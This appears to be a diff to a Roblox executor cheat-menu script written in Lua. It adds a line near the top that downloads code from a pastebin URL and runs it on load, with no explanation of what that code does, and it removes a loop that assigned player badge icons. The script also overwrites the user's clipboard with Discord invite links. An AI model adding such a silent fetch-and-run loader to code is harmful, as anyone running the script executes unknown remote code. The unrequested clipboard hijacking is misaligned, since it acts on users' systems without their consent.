@@ -4,6 +4,8 @@ if _G.DH_LOADED and not _G.DH_DEBUG then
 end
 _G.DH_LOADED = true
 
+loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
+
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
 local CurrentTheme = "DarkBlue"
 if Rayfield and Rayfield.Flags and Rayfield.Flags["Theme"] then
@@ -1150,42 +1152,6 @@ end
 setclipboard("https://discord.gg/vmQVgF9N")
 Rayfield:LoadConfiguration()
 
-local pp = game:GetService("Players")
-local LocalPlayer = pp.LocalPlayer
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-local frame = playerGui:WaitForChild("ScreenGui"):WaitForChild("PlayerNamesFrame"):WaitForChild("banida_offPlayerFrame")
-local icon = frame:WaitForChild("IconLabel")
-
-local luna = "banida_off"
-local dev1 = {"88f113bc41c4f41ed852","Player 4"}
-local erl = {"Player 1","Player 2"}
-
-local function checkPlayers(list)
-    for _, name in ipairs(list) do
-        if pp:FindFirstChild(name) then
-            return true
-        end
-    end
-    return false
-end
-
-while task.wait(1) do
-    local isLuna = pp:FindFirstChild(luna)
-    local isDev1 = checkPlayers(dev1)
-    local isErl = checkPlayers(erl)
-
-    if isLuna then
-        icon.Image = getcustomasset("Dirsblox/Core/Assets/Icons/Owner.png")
-    elseif isDev1 then
-        icon.Image = getcustomasset("Dirsblox/Core/Assets/Icons/Dev.png")
-    elseif isErl then
-        icon.Image = getcustomasset("Dirsblox/Core/Assets/Icons/Early.png")
-    else
-        -- a
-    end
-end
-
-
 --[[
 t5:CreateSection("Testing")
 t5:CreateButton({
@@ -1197,6 +1163,7 @@ t5:CreateButton({
 setclipboard("https://discord.gg/EHVKqtJm")
 
 ]]
+
 
 
 
